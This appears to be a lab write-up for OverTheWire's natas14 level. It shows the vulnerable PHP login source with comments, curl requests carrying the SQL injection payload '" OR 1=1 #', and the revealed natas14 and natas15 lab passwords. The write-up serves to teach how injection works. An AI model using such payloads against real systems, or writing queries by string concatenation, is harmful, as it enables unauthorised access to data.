### natas14 pswd: A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8

```bash
curl  -s -X POST http://natas14:A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8@natas14.natas.labs.overthewire.org

# <html>
# <body>
# <h1>natas14</h1>
# <div id="content">
# 
# <form action="index.php" method="POST">
# Username: <input name="username"><br>
# Password: <input name="password"><br>
# <input type="submit" value="Login" />
# </form>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>
```

Getting the source code:

```bash
curl  -s http://natas14:A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8@natas14.natas.labs.overthewire.org/index-source.html | w3m -dump -T text/html
# <html>
# <body>
# <h1>natas14</h1>
# <div id="content">
# <?php
# if(array_key_exists("username", $_REQUEST)) {
#     $link = mysqli_connect('localhost', 'natas14', '<censored>');
#     mysqli_select_db($link, 'natas14');
# 
#     $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\
# " and password=\"".$_REQUEST["password"]."\"";
#     if(array_key_exists("debug", $_GET)) {
#         echo "Executing query: $query<br>";
#     }
# 
#     if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
#             echo "Successful login! The password for natas15 is <censored><br>"
# ;
#     } else {
#             echo "Access denied!<br>";
#     }
#     mysqli_close($link);
# } else {
# ?>
# 
# <form action="index.php" method="POST">
# Username: <input name="username"><br>
# Password: <input name="password"><br>
# <input type="submit" value="Login" />
# </form>
# <?php } ?>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>
```

The php code with comments:

```php
<html>
<body>
<h1>natas14</h1>
<div id="content">
<?php

// 1. CHECK FOR SUBMISSION
// Has the user submitted the form? (Checks if 'username' exists in the GET/POST request)
if(array_key_exists("username", $_REQUEST)) {
    
    // 2. CONNECT TO THE DATABASE
    // Connects to a local MySQL database using the natas14 user and its password.
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14'); // Selects the specific 'natas14' database

    // ---------------------------------------------------------
    // 3. BUILD THE SQL QUERY (THE FATAL FLAW)
    // ---------------------------------------------------------
    // The developer is trying to find a user in the database whose username AND password 
    // match what was typed into the form. 
    //
    // THE FLAW: They are taking the raw input ($_REQUEST["username"]) and directly 
    // gluing it (concatenating it) into the SQL database command using PHP's dot (.) operator.
    // There is no sanitization, escaping, or checking of what has been typed.
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    
    
    // 4. THE DEBUG HELPER (A gift to attackers)
    // When adding "?debug" to the URL, the server will print the exact SQL query it 
    // generated. This is extremely helpful for us to see how our attack modifies the query.
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    // 5. EXECUTE AND VERIFY
    // mysqli_query() sends the command to the database.
    // mysqli_num_rows() counts how many results came back.
    // If the database returns 1 or more rows (meaning it found a match), it gives us natas15 psw!
    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    
    mysqli_close($link); // Close the database connection
} else {
?>

<!-- 6. THE HTML FORM -->
<!-- A standard login form. Notice it uses double quotes around the input names. -->
<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

The "naive" SQL query looks like this:

```sql
SELECT * from users where username="admin" and password="password123"
```
This command would search for rows where username is *admin* **and** password 
is *password123* and it would print that row.

We're not aware of the database users and passwords but we can manipulate 
the username by entering `" OR 1=1 #` so our SQL query becomes:

```sql
SELECT * from users where username="" OR 1=1 #" and password=""
```

This command would look for rows where username is empty **OR** `1=1` - which is valid for all the rows of the database, so the query lists the whole database and we're getting our reward:

```bash
curl  -s -X POST -d 'username=" OR 1=1 %23&password='  http://natas14:A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8@natas14.natas.labs.overthewire.org/index.php
# <html>
# <body>
# <h1>natas14</h1>
# <div id="content">
Successful login! The password for natas15 is GB6USCJYJjwLyYhZUNkE1NwDueiTow6g<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>
```

Just for fun we can use `debug` to see exactly our manipulated SQL query:

```bash
curl  -s -X POST -d 'username=" OR 1=1 %23&password='  "http://natas14:A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8@natas14.natas.labs.overthewire.org/index.php?debug"
# <html>
# <body>
# <h1>natas14</h1>
# <div id="content">
Executing query: SELECT * from users where username="" OR 1=1 #" and password=""<br>Successful login! The password for natas15 is GB6USCJYJjwLyYhZUNkE1NwDueiTow6g<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>
```